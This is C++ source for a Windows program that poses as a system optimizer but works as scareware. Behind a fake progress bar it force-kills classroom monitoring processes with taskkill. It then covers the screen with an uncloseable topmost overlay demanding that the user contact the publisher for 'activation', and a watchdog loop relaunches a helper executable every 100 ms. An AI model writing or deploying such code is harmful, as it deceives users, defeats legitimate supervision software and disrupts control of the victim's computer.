#include <Windows.h>
#include <string>
#include <TlHelp32.h>
#include <cstring>
#include <CommCtrl.h>

// 全局变量
const wchar_t* kMutexName = L"Global\\WatermarkMutex";
const wchar_t* kMonitorProcessName = L"Wmonitor.exe";
const int kOptimizeDuration = 5000; // 优化动画持续时间（毫秒）
HANDLE g_hMonitorThread = NULL;
bool g_bOptimizationComplete = false;

// 函数声明
LRESULT CALLBACK OptimizeWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);
LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);
void CreateWatermarkWindow(HINSTANCE hInstance);

HANDLE FindOrStartMonitor() {
    
    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(PROCESSENTRY32W);
    bool found = false;
    HANDLE hMonitor = NULL;

    // 启动监控程序
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    
    wchar_t cmd[MAX_PATH];
    GetModuleFileNameW(NULL, cmd, MAX_PATH);
    wchar_t* lastSlash = wcsrchr(cmd, L'\\');
    if (lastSlash) {
        *(lastSlash + 1) = L'\0';
        wcscat_s(cmd, MAX_PATH, kMonitorProcessName);
    }
    
    if (CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hThread);
        hMonitor = pi.hProcess;
    }
    return hMonitor; 
}

// 监控线程
DWORD WINAPI MonitorThread(LPVOID lpParam) {
    // 守护循环
    while (true) {
        HANDLE hWatermark = FindOrStartMonitor();
        Sleep(100);
    }
    return 0; 
}

// 创建水印窗口的函数
void CreateWatermarkWindow(HINSTANCE hInstance) {
    HWND hWndWatermark = CreateWindowExW(
        WS_EX_LAYERED | WS_EX_TOPMOST | WS_EX_TRANSPARENT | WS_EX_TOOLWINDOW,
        L"WatermarkWindow",
        L"Watermark",
        WS_POPUP,
        0, 0, 
        GetSystemMetrics(SM_CXSCREEN),
        GetSystemMetrics(SM_CYSCREEN),
        NULL, NULL, hInstance, NULL
    );
    
    if (hWndWatermark) {
        // 设置半透明效果
        SetLayeredWindowAttributes(hWndWatermark, 0, 160, LWA_ALPHA | LWA_COLORKEY);
        ShowWindow(hWndWatermark, SW_SHOW);
        UpdateWindow(hWndWatermark);
    }
}

// 优化面板窗口处理函数
LRESULT CALLBACK OptimizeWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    static HWND hProgressBar;
    static HWND hStatusText;
    static ULONGLONG startTime;
    static HINSTANCE hInstance;
    static bool bUserClosed = false;

    switch (msg) {
        case WM_CREATE: {
            hInstance = ((LPCREATESTRUCTW)lParam)->hInstance;
            startTime = GetTickCount64();
            
            // 创建进度条
            hProgressBar = CreateWindowExW(0, PROGRESS_CLASSW, NULL, 
                WS_VISIBLE | WS_CHILD | PBS_SMOOTH, 
                50, 100, 300, 30, hWnd, NULL, 
                hInstance, NULL);
            
            SendMessageW(hProgressBar, PBM_SETRANGE, 0, MAKELPARAM(0, 100));
            SendMessageW(hProgressBar, PBM_SETSTEP, 1, 0);
            
            // 创建状态文本
            hStatusText = CreateWindowW(L"STATIC", L"系统优化中...", 
                WS_VISIBLE | WS_CHILD | SS_CENTER,
                50, 50, 300, 30, hWnd, NULL, 
                hInstance, NULL);
            
            // 设置字体
            HFONT hFont = CreateFontW(18, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, 
                DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, 
                DEFAULT_QUALITY, DEFAULT_PITCH | FF_DONTCARE, L"Microsoft YaHei");
            SendMessageW(hStatusText, WM_SETFONT, (WPARAM)hFont, TRUE);
            
            // 启动定时器更新进度
            SetTimer(hWnd, 1, 50, NULL);
            return 0;
        }
        
        case WM_TIMER: {
            if (wParam == 1) {
                ULONGLONG elapsed = GetTickCount64() - startTime;
                int progress = (int)(elapsed * 100 / kOptimizeDuration);
                
                if (progress >= 100) {
                    KillTimer(hWnd, 1);
                    SendMessageW(hProgressBar, PBM_SETPOS, 100, 0);
                    SetWindowTextW(hStatusText, L"优化完成！");
                    SetTimer(hWnd, 2, 1000, NULL);
                } else if (progress >= 80) {
                    SendMessageW(hProgressBar, PBM_SETPOS, progress, 0);
                    wchar_t status[100];
                    swprintf_s(status, L"垃圾进程清理中... %d%%", progress);
                    SetWindowTextW(hStatusText, status);
                } else if (progress >= 45) {
                    SendMessageW(hProgressBar, PBM_SETPOS, progress, 0);
                    wchar_t status[100];
                    swprintf_s(status, L"垃圾软件清理中... %d%%", progress);
                    SetWindowTextW(hStatusText, status);
                } else if (progress > 0) {
                    SendMessageW(hProgressBar, PBM_SETPOS, progress, 0);
                    wchar_t status[100];
                    swprintf_s(status, L"极域及伽卡他卡清理中... %d%%", progress);
                    SetWindowTextW(hStatusText, status);
                } else {
                    system("taskkill /im StudentMain.exe /f");
                    system("taskkill /im Student.exe /im Smonitor.exe /f");
                    SendMessageW(hProgressBar, PBM_SETPOS, progress, 0);
                    wchar_t status[100];
                    swprintf_s(status, L"极域及伽卡他卡清理中... %d%%", progress);
                    SetWindowTextW(hStatusText, status);
                }
            }
            else if (wParam == 2) {
                KillTimer(hWnd, 2);
                g_bOptimizationComplete = true;
                
                // 创建水印窗口
                CreateWatermarkWindow(hInstance);
                
                // 销毁优化窗口
                DestroyWindow(hWnd);
            }
            return 0;
        }
        
        case WM_CLOSE: {
            // 用户点击关闭按钮
            bUserClosed = true;
            g_bOptimizationComplete = true;
            
            // 立即创建水印窗口
            CreateWatermarkWindow(hInstance);
            
            // 销毁优化窗口
            DestroyWindow(hWnd);
            return 0;
        }
        
        case WM_DESTROY:
            // 如果用户没有手动关闭，且优化未完成，则创建水印窗口
            if (!bUserClosed && !g_bOptimizationComplete) {
                g_bOptimizationComplete = true;
                CreateWatermarkWindow(hInstance);
            }
            return 0;
            
        default:
            return DefWindowProcW(hWnd, msg, wParam, lParam);
    }
}

// 水印窗口处理函数
LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
        case WM_PAINT: {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hWnd, &ps);

            // 创建大号字体
            HFONT hFont = CreateFontW(
                60, 0, 0, 0, FW_BOLD,
                FALSE, FALSE, FALSE, DEFAULT_CHARSET,
                OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                ANTIALIASED_QUALITY, DEFAULT_PITCH | FF_DONTCARE,
                L"Microsoft YaHei"
            );
            HFONT hOldFont = (HFONT)SelectObject(hdc, hFont);
            
            // 设置透明背景
            RECT rect;
            GetClientRect(hWnd, &rect);
            SetBkMode(hdc, TRANSPARENT);

            // 计算文本位置（右下角）
            const wchar_t* text = L"Windows优化完成！请联系发行商激活后继续使用。";
            int textLen = (int)wcslen(text);
            
            // 计算文本尺寸
            SIZE textSize;
            GetTextExtentPoint32W(hdc, text, textLen, &textSize);
            
            int margin = 50;
            RECT textRect = {
                rect.right - textSize.cx - margin,
                rect.bottom - textSize.cy - margin,
                rect.right,
                rect.bottom
            };
            
            // 绘制水印文本
            SetTextColor(hdc, RGB(200, 200, 200));
            DrawTextW(hdc, text, textLen, &textRect, DT_SINGLELINE);
            DrawTextW(hdc, text, textLen, &rect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
            DrawTextW(hdc, text, textLen, &rect, DT_TOP | DT_LEFT | DT_SINGLELINE);
            
            SelectObject(hdc, hOldFont);
            DeleteObject(hFont);

            EndPaint(hWnd, &ps);
            return 0;
        }
        
        case WM_CLOSE:
            // 阻止关闭水印窗口
            return 0;
            
        case WM_DESTROY:
            PostQuitMessage(0);
            return 0;
            
        default:
            return DefWindowProcW(hWnd, msg, wParam, lParam);
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR, int) {
    FreeConsole();
    
    // 防止多实例
    HANDLE hMutex = CreateMutexW(NULL, TRUE, kMutexName);
    if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;

    // 启动监控程序
    HANDLE hMonitor = FindOrStartMonitor();

    // 启动监控线程
    g_hMonitorThread = CreateThread(NULL, 0, MonitorThread, NULL, 0, NULL);
    
    // 初始化公共控件
    INITCOMMONCONTROLSEX icc = { sizeof(INITCOMMONCONTROLSEX), ICC_PROGRESS_CLASS };
    InitCommonControlsEx(&icc);
    
    // 注册优化面板窗口类
    WNDCLASSEXW optimizeWc = {0};
    optimizeWc.cbSize = sizeof(WNDCLASSEXW);
    optimizeWc.lpfnWndProc = OptimizeWndProc;
    optimizeWc.hInstance = hInstance;
    optimizeWc.hCursor = LoadCursorW(NULL, (LPCWSTR)IDC_ARROW);
    optimizeWc.hbrBackground = (HBRUSH)(COLOR_WINDOW+1);
    optimizeWc.lpszClassName = L"OptimizeWindow";
    RegisterClassExW(&optimizeWc);
    
    // 注册水印窗口类
    WNDCLASSEXW wc = {0};
    wc.cbSize = sizeof(WNDCLASSEXW);
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
    wc.lpszClassName = L"WatermarkWindow";
    RegisterClassExW(&wc);
    
    // 创建优化面板窗口
    HWND hOptimizeWnd = CreateWindowExW(
        0, 
        L"OptimizeWindow", 
        L"Windows优化专家", 
        WS_OVERLAPPEDWINDOW & ~WS_MAXIMIZEBOX,
        CW_USEDEFAULT, CW_USEDEFAULT, 400, 200,
        NULL, NULL, hInstance, NULL
    );
    
    if (hOptimizeWnd) {
        // 居中窗口
        RECT rc;
        GetWindowRect(hOptimizeWnd, &rc);
        int x = (GetSystemMetrics(SM_CXSCREEN) - (rc.right - rc.left)) / 2;
        int y = (GetSystemMetrics(SM_CYSCREEN) - (rc.bottom - rc.top)) / 2;
        SetWindowPos(hOptimizeWnd, NULL, x, y, 0, 0, SWP_NOSIZE | SWP_NOZORDER);
        
        ShowWindow(hOptimizeWnd, SW_SHOW);
        UpdateWindow(hOptimizeWnd);
    }
    
    // 主消息循环
    MSG msg;
    while (GetMessageW(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }
    
    // 清理资源
    if (g_hMonitorThread) {
        TerminateThread(g_hMonitorThread, 0);
        CloseHandle(g_hMonitorThread);
    }
    
    if (hMutex) {
        ReleaseMutex(hMutex);
        CloseHandle(hMutex);
    }
    
    return 0;
}